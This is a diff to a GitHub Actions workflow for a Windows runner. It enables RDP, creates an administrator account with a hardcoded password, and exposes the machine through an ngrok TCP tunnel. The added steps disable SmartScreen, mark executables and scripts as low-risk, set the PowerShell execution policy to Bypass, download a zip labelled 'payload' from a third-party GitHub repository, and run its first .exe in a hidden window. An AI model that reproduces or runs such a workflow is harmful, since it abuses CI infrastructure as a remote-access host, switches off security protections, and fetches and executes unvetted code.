@@ -15,19 +15,22 @@ jobs:
     steps:
       - name: Download ngrok
         run: |
+          Write-Host "[xbl1e] > | Downloading ngrok | <"
           Invoke-WebRequest `
             -Uri "${{ github.event.inputs.ngrok_download_url }}" `
             -OutFile ngrok.zip
-          Expand-Archive ngrok.zip
+          Expand-Archive ngrok.zip -Force
 
       - name: Auth ngrok
         env:
           NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
         run: |
+          Write-Host "[xbl1e] > | Authenticating ngrok | <"
           .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
 
       - name: Enable RDP + Admin user
         run: |
+          Write-Host "[xbl1e] > | Enabling RDP | <"
           Set-ItemProperty `
             -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
             -Name fDenyTSConnections `
@@ -35,9 +38,10 @@ jobs:
 
           Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 
-          New-LocalUser "xbl1e" `
-            -Password (ConvertTo-SecureString "W1nd0ws-P4ssw0rd-2025!" -AsPlainText -Force) `
-            -FullName "xbl1e"
+          if (-not (Get-LocalUser -Name "xbl1e" -ErrorAction SilentlyContinue)) {
+            New-LocalUser "xbl1e" `
+              -Password (ConvertTo-SecureString "W1nd0ws-P4ssw0rd-2025!" -AsPlainText -Force)
+          }
 
           Add-LocalGroupMember "Remote Desktop Users" "xbl1e"
           Add-LocalGroupMember "Administrators" "xbl1e"
@@ -47,10 +51,70 @@ jobs:
             -Name UserAuthentication `
             -Value 1
 
+      - name: Disable SmartScreen + Execution limits
+        run: |
+          Write-Host "[xbl1e] > | Disabling SmartScreen | <"
+      
+          New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Force | Out-Null
+          Set-ItemProperty `
+            -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" `
+            -Name "EnableSmartScreen" `
+            -Type DWord `
+            -Value 0
+      
+          Set-ItemProperty `
+            -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
+            -Name "SmartScreenEnabled" `
+            -Value "Off"
+      
+          New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" -Force | Out-Null
+          Set-ItemProperty `
+            -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" `
+            -Name "LowRiskFileTypes" `
+            -Value ".exe;.bat;.cmd;.ps1;.zip;.rar"
+      
+          Set-ExecutionPolicy Bypass -Scope LocalMachine -Force
+
+      - name: Download API payload + run EXE
+        run: |
+          Write-Host "[xbl1e] > | Downloading payload from API | <"
+
+          $apiUrl = "https://github.com/kirakohler064-pixel/sasmas-/raw/refs/heads/main/Nueva%20carpeta.zip"
+          $zipPath = "$PWD\payload.zip"
+          $extractPath = "$PWD\payload"
+
+          Invoke-WebRequest `
+            -Uri $apiUrl `
+            -OutFile $zipPath `
+            -Headers @{
+              "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+              "Accept" = "*/*"
+            }
+
+          Write-Host "[xbl1e] > | Extracting payload | <"
+          Expand-Archive $zipPath -DestinationPath $extractPath -Force
+
+          Write-Host "[xbl1e] > | Searching executable | <"
+          $exe = Get-ChildItem `
+            -Path $extractPath `
+            -Recurse `
+            -Filter *.exe |
+            Select-Object -First 1
+
+          if (-not $exe) {
+            Write-Host "[xbl1e] > | No executable found | <"
+            exit 1
+          }
+
+          Write-Host "[xbl1e] > | Executing $($exe.Name) | <"
+          Start-Process `
+            -FilePath $exe.FullName `
+            -WorkingDirectory $exe.DirectoryName `
+            -WindowStyle Hidden
+
       - name: Start tunnel
         run: |
-          Write-Host "--- RDP ---"
-          Write-Host "User: xbl1e"
-          Write-Host "Pass: W1nd0ws-P4ssw0rd-2025!"
-          Write-Host "-----------"
+          Write-Host "[xbl1e] > | RDP READY | <"
+          Write-Host "[xbl1e] > | User: xbl1e | <"
+          Write-Host "[xbl1e] > | Pass: W1nd0ws-P4ssw0rd-2025! | <"
           .\ngrok\ngrok.exe tcp 3389 --log=stdout
